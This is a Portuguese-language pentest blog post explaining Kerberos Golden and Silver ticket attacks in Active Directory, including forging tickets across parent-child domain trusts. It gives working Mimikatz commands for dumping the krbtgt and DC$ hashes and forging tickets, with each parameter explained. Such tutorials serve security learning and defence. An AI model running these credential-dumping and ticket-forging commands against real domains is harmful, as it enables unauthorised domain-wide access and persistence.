---
title: "Active Directory - Explorando Trusts - Tickets"
tags: [Windows,Active Directory]
categories: ActiveDirectory
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/golden.png)

# Tickets

Agora vamos abordar outro ponto a exploração. Vamos partir pra criação dos famosos Golden e Silver tickets. A foto de capa do post é análoga ao Willy Wonka, com um Golden Ticket da acessos ao personagem, do mesmo modo em um AD, um Golden Ticket nos da acesso que teoricamente não deveriamos ter, acesso à máquinas, arquivos e o mais importante *Domain Controllers*!

# Golden Ticket

Um Golden Ticket é um token de autenticação do Kerberos para o KRBTGT, que pode ser usado junto com o pass-the-hash para logar em qualquer conta, habilitando o atacante a se mover por toda a rede.

# Silver Ticket

Mas que diabos então é um Silver Ticket?

Silver tickets são tipos de Golden Tickets, isso mesmo, que são feito para se autenticar em serviços específicos. Esses tickets podem ser forjados a partir de senhas crackeadas de usuários, que são usadas para gerar os tickets falsos.

Os Silver Tickets são mais difíceis de detectar, tendo em vista que não há comunicação entre o serviço e o DC, todo log ficará no computador em que foi comprometido, dificultando e muito a detecção!

# Como criar Golden Tickets?

Primeiro o atacante deve ter tomado controle de um DC, pra sendo assim poder extrair o hash do KRBTGT

Uma vez dentro da máquina, realizamos a extração do hash do krbtgt

`Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject /name:krbtgt"'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/golden1.png)

Após extraido podemos utilizar ele na nossa host mesmo para a criação do golden ticket

Aqui no caso eu criei um usuário que não existe, só pra comprovar que o ataque realmente funciona

`kerberos::golden /domain:xxx.local /sid:S-1-5-21-3965405831... /rc4:c6d349.... /user:newAdmin /id:500 /ptt`

```
/domain – o FQDN.

/sid – o SID do dominio.

/user – a conta que será impersonificada.

/id – o RID da conta que será impersonificada. Vou usar 500, pq esse é o default do administrator.

/ptt – vai injetar o ticket direto nessa seção

/rc4 – o hash do krbtgt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/golden2.png)

Show... Esse foi um dos exemplos, outro que vou citar agora vai ser o foco desse post, que é que podemos explorar os trusts entre Domains com o Golden Ticket, whaat? Isso mesmo, acredita!

# Explorando Trust Domains

A ideia aqui é acessar servidores que não deveriamos ter acesso de modo algum, contudo entre os Forests sempre (ou quase sempre) há relação de confiança, os chamados Trusts, e vamos lá, se um forest confia no outro, ele vai dar acesso, se nós conseguimos nos passar por um forest, o outro vai aceitar a conexão... simples, não?

Para conseguir esses SIDs para podermos explorar a relação de confiança, iremos utilizar o `PowerView_dev.ps1` com os comandos listados:

```
FILHO - Get-DomainSID
PAI - Get-DomainSID -Domain funcorp.local
```

O que é pai e filho? Pai seria por exemplo o `abc.def.local`, o filho seria o `def.local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/golden3.png)

`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:DOMINIO_FILHO /sid:SID DO DOMINIO FILHO /krbtgt:HASH DO KRBTGT /sids:SID DO DOMINIO PAI /ptt"'`

```
/user:Usuário

/domain:dominio que estou (filho) 

/sid:sid do FILHO 

/krbtgt:hash do KRBTGT

/sids:sid do PAI

/ptt
```

Executamos o ataque!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/golden4.png)

Pronto! Assim exploramos também o Trust Domain com o Golden Ticket, ou seja, se conseguimos o hash do KRBTGT, acabou!

Agora vamos partir pros ataques de Silver Ticket

# Como criar Silver Tickets?

A ideia é praticamente a mesma do golden ticket, só que ao invés de tickets para a seção como um todo, vamos criar somente para alguns serviços específicos, a base do comando é a mesma, então vou me furtar a discriminar como obter cada dado

Primeiro verificamos que não temos acesso ao servidor DC

`gwmi -Class win32_operatingsystem -ComputerName dc.local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/silver.png)

Diferente do Golden Ticket, no silver ticket nós devemos ter o hash da máquina pra poder realizar o ataque, uma vez que vamos criar um TGS válido para aquela máquina em específico.

Então, após ter o controle da máquina, com o Mimikatz nós extraimos o hash do DC$

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/silver1.png)

Realizamos o Silver Ticket

`Invoke-Mimikatz -Command '"kerberos::golden /domain:xxxxx.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /target:dc.xx.local /service:HOST /rc4:hash do DC$ /user:Administrator /ptt"'`

```
/domain:domínio que estou

/sid:sid do domínio (Get-DomainSid)

/target:a máquina alvo, no caso o DC

/service:o serviço que vou explorar

/rc4:o hash do DC$

/user:o usuário que vou impersonificar

/ptt:pra injetar de imediato o ticket
```

Aqui no caso eu quero explorar o `tasks` dele, pra poder agendar uma task e executar ela... mas isso pode ser revertido pra qualquer serviço que eu queira

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/silver2.png)

Pronto, esse foi o ataque de silver ticket. Terminamos por aqui a exploração dos tickets.